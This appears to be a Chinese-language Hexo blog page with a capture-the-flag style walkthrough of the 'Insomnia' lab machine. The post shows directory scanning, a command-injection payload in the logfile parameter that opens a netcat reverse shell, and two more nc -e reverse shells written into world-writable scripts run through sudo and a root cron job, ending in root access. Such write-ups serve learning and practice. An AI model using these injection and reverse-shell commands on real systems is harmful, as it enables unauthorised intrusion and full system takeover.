@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        hackme | Hexo
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/normal.ttf);
+        font-weight: normal;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3"/>
+    
+    
+    <div class=head>
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-right">
+          
+            <div class="search-outer" id="algolia-search"></div>
+          
+          <div class="nav-menu">
+            
+              
+                <a class="nav-menu-item" href="/feat">比赛&靶场</a>
+              
+                <a class="nav-menu-item" href="/base">知识总结</a>
+              
+                <a class="nav-menu-item" href="/cv">个人日常</a>
+              
+            
+            
+          </div>
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">hackme</div>
+        <div class="post-info">
+          
+  
+
+
+          <span class="post-date">2025-08-04</span>
+        </div>
+      </div>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <h2><span id="insomnia">Insomnia</span></h2><p>扫描端口只开了一个8080,dirsearch扫目录</p>
+<p>扫到一个administration.php</p>
+<p>进行wfuzz得到参数是logfile</p>
+<p>尝试反弹shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.59</span>:<span class="number">8080</span>/administration.php?logfile=;nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">1234</span> -e /<span class="built_in">bin</span>/bash;</span><br></pre></td></tr></table></figure>
+
+<p>www-data用户可以无密码指定julia执行start.sh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> www-data on insomnia:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/<span class="built_in">bin</span>\:/usr/sbin\:/usr/<span class="built_in">bin</span>\:/sbin\:/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on insomnia:</span><br><span class="line">    (julia) NOPASSWD: /<span class="built_in">bin</span>/bash /var/www/html/start.sh</span><br></pre></td></tr></table></figure>
+
+<p>这里我们发现start.sh所有用户都可读可写可执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ ls -al</span><br><span class="line">ls -al</span><br><span class="line">total <span class="number">60</span></span><br><span class="line">drwxr-xr-x <span class="number">3</span> www-data www-data  <span class="number">4096</span> May <span class="number">29</span> 09:<span class="number">55</span> .</span><br><span class="line">drwxr-xr-x <span class="number">3</span> root     root      <span class="number">4096</span> Dec <span class="number">17</span>  <span class="number">2020</span> ..</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data   <span class="number">426</span> Dec <span class="number">21</span>  <span class="number">2020</span> administration.php</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1610</span> Dec <span class="number">20</span>  <span class="number">2020</span> chat.js</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data <span class="number">19679</span> May <span class="number">30</span> 03:<span class="number">24</span> chat.txt</span><br><span class="line">drwxr-xr-x <span class="number">2</span> www-data www-data  <span class="number">4096</span> Dec <span class="number">20</span>  <span class="number">2020</span> images</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">2899</span> Dec <span class="number">21</span>  <span class="number">2020</span> index.php</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1684</span> Dec <span class="number">20</span>  <span class="number">2020</span> process.php</span><br><span class="line">-rwxrwxrwx <span class="number">1</span> root     root        <span class="number">38</span> May <span class="number">30</span> 03:<span class="number">16</span> start.sh</span><br><span class="line">-rw-r--r-- <span class="number">1</span> www-data www-data  <span class="number">1363</span> Dec <span class="number">20</span>  <span class="number">2020</span> style.css</span><br></pre></td></tr></table></figure>
+
+<p>写反弹shell指令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www-data@insomnia:~/html$ cat start.sh</span><br><span class="line">cat start.sh</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br><span class="line">nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">12345</span> -e /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>
+
+<p>进入julia用户后利用定时任务提权</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:~$ cat /etc/crontab</span><br><span class="line">cat /etc/crontab</span><br><span class="line"><span class="comment"># /etc/crontab: system-wide crontab</span></span><br><span class="line"><span class="comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span></span><br><span class="line"><span class="comment"># command to install the new version when you edit this file</span></span><br><span class="line"><span class="comment"># and files in /etc/cron.d. These files also have username fields,</span></span><br><span class="line"><span class="comment"># that none of the other crontabs do.</span></span><br><span class="line"></span><br><span class="line">SHELL=/<span class="built_in">bin</span>/sh</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/<span class="built_in">bin</span>:/sbin:/<span class="built_in">bin</span>:/usr/sbin:/usr/<span class="built_in">bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example of job definition:</span></span><br><span class="line"><span class="comment"># .---------------- minute (0 - 59)</span></span><br><span class="line"><span class="comment"># |  .------------- hour (0 - 23)</span></span><br><span class="line"><span class="comment"># |  |  .---------- day of month (1 - 31)</span></span><br><span class="line"><span class="comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span></span><br><span class="line"><span class="comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span></span><br><span class="line"><span class="comment"># |  |  |  |  |</span></span><br><span class="line"><span class="comment"># *  *  *  *  * user-name command to be executed</span></span><br><span class="line"><span class="number">17</span> *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly</span><br><span class="line"><span class="number">25</span> <span class="number">6</span>    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )</span><br><span class="line"><span class="number">47</span> <span class="number">6</span>    * * <span class="number">7</span>   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )</span><br><span class="line"><span class="number">52</span> <span class="number">6</span>    <span class="number">1</span> * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )</span><br><span class="line">*  *    * * *   root    /<span class="built_in">bin</span>/bash /var/cron/check.sh</span><br></pre></td></tr></table></figure>
+
+<p>这里的check.sh也是全用户可读可写可执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">julia@insomnia:~$ cat /var/cron/check.sh</span><br><span class="line">cat /var/cron/check.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">status=$(systemctl <span class="keyword">is</span>-active insomnia.service)</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;$status&quot;</span> == <span class="string">&quot;active&quot;</span>  ]; then</span><br><span class="line">   echo <span class="string">&quot;OK&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">   systemctl start  insomnia.service</span><br><span class="line">fi</span><br><span class="line">nc <span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span> <span class="number">1235</span> -e /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure>
+
+<p>监听等待即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/baji]</span><br><span class="line">└─$ nc -lvnp <span class="number">1235</span></span><br><span class="line">listening on [<span class="built_in">any</span>] <span class="number">1235</span> ...</span><br><span class="line">connect to [<span class="number">192.168</span><span class="number">.56</span><span class="number">.4</span>] <span class="keyword">from</span> (UNKNOWN) [<span class="number">192.168</span><span class="number">.56</span><span class="number">.59</span>] <span class="number">47920</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+    </div>
+    
+      <script src='https://unpkg.com/mermaid@latest/dist/mermaid.min.js'></script>
+      <script>
+        if (window.mermaid) {
+          mermaid.initialize({"startOnload":true});
+        }
+      </script>
+    
+  </article>
+  <div class="post__foot">
+    
+      <div class="like-author">
+  <input type="checkbox" id="likeCode" />
+  <div class="author-face">
+    <img height="100px"
+         width="100px"
+         id="front-face"
+         alt="author face"
+         src="/assets/author-face.jpg" />
+    <img height="100px"
+         width="100px"
+         id="back-face"
+         alt="like code"
+         src="/assets/pay-code.jpg" />
+  </div>
+  <div class="like-text">“给作者倒杯卡布奇诺”</div>
+  <label for="likeCode" class="like-btn">
+    <svg viewBox="0 0 1024 1024"
+         width="20px"
+         style="margin-right: 10px"
+         height="20px">
+      <path d="M466.88 908.96L113.824 563.296a270.08 270.08 0 0 1 0-387.392c108.8-106.56 284.896-106.56 393.696 0 1.504 1.472 2.976 2.944 4.448 4.48 1.472-1.536 2.944-3.008 4.448-4.48 108.8-106.56 284.896-106.56 393.696 0a269.952 269.952 0 0 1 34.016 347.072l-387.392 385.6a64 64 0 0 1-89.92 0.384z" p-id="13650" fill="#ee4242" />
+    </svg>
+    喜欢作者
+  </label>
+</div>
+
+    
+    <div class="post-nav">
+  
+    <div class="post-nav-item-left"></div>
+  
+  <div class="vhr"></div>
+  
+    <div class="post-nav-item-right"></div>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  
+
+</div>
+  <div class="realated__body">
+    
+      
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+  <div class="foot-inner">
+    <div class="foot__head">
+      
+        <div class="foot-line">
+          <div class="matts">海</div><div class="matts">内</div><div class="matts">存</div><div class="matts">知</div><div class="matts">己</div>
+        </div>
+      
+        <div class="foot-line">
+          <div class="matts">天</div><div class="matts">涯</div><div class="matts">若</div><div class="matts">比</div><div class="matts">邻</div>
+        </div>
+      
+    </div>
+    <div class="foot__body">
+      
+        <div class="foot-item">
+          <div class="foot-item__head">朋友</div>
+          <div class="foot-item__body">
+            
+            
+
+
+  
+  
+    <div class="foot-link-group">
+      
+        
+        
+          <div class="text">
+            <img alt="link"
+                 height="20px"
+                 width="20px"
+                 src="/images/icon/icon-link.svg" />
+            <a class="foot-link" href="">空缺</a>
+          </div>
+        
+      
+        
+        
+          <div class="text">
+            <img alt="link"
+                 height="20px"
+                 width="20px"
+                 src="/images/icon/icon-link+.svg" />
+            <a class="foot-link" href="mailto:example@email.com?subject=申请https://shen9nAn.github.io的友链">申请友链</a>
+          </div>
+        
+      
+        
+        
+      
+        
+        
+      
+    </div>
+  
+
+
+          </div>
+        </div>
+      
+      
+        <div class="foot-item">
+          <div class="foot-item__head">账号</div>
+          <div class="foot-item__body">
+            
+
+
+  
+  
+    <div class="foot-link-group">
+      
+        
+        
+          <div class="text">
+            <img alt="link"
+                 height="20px"
+                 width="20px"
+                 src="/images/logo-github.svg" />
+            <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/shen9nAn">shen9nAn</a>
+          </div>
+        
+      
+        
+        
+          <div class="text">
+            <img alt="link"
+                 height="20px"
+                 width="20px"
+                 src="/images/wx.ico" />
+            <a class="foot-link" href="/images/wx.png">笙南</a>
+          </div>
+        
+      
+        
+        
+      
+        
+        
+      
+    </div>
+  
+
+
+          </div>
+        </div>
+      
+      <div class="foot-item">
+        <div class="foot-item__head">联系</div>
+        <div class="foot-item__body">
+          
+
+
+  
+  
+    <div class="foot-link-group">
+      
+        
+        
+          <div class="text">
+            <img alt="link"
+                 height="20px"
+                 width="20px"
+                 src="/images/icon/icon-email.svg" />
+            <a class="foot-link" href="mailto:3154144119@qq.com">3154144119@qq.com</a>
+          </div>
+        
+      
+        
+        
+      
+        
+        
+      
+        
+        
+      
+    </div>
+  
+
+
+        </div>
+      </div>
+    </div>
+    <div class="copyright">
+      <a href="https://shen9nAn.github.io">Hexo</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+      <svg width="20" height="20" viewBox="0 0 725 725">
+        <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+        <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+        <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+      </svg>
+      <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+    </div>
+  </div>
+</div>
+
+    
+    
+      <script src="https://cdn.jsdelivr.net/npm/@docsearch/js@3"></script>
+      <script type="text/javascript">
+        docsearch({
+          appId: 'appId',
+          apiKey: 'apiKey',
+          indexName: 'indexName',
+          insights: 'true',
+          container: 'div#algolia-search',
+          debug: 'false'
+        });
+      </script>
+    
+    <script src="/js/copy-code.js"></script>
+    
+  
+
+  </body>
+</html>
